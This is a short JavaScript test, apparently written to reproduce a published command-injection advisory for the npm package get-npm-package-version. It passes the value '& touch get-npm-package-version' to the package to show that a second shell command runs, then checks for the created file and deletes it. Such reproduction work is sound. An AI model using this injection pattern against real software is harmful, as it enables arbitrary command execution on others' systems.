//https://snyk.io/vuln/SNYK-JS-GETNPMPACKAGEVERSION-1050390
test("Command Injection in get-npm-package-version", () => {
  const a = require("get-npm-package-version");
  const fs = require("fs");
  const path = "./get-npm-package-version";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  a("& touch get-npm-package-version");

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
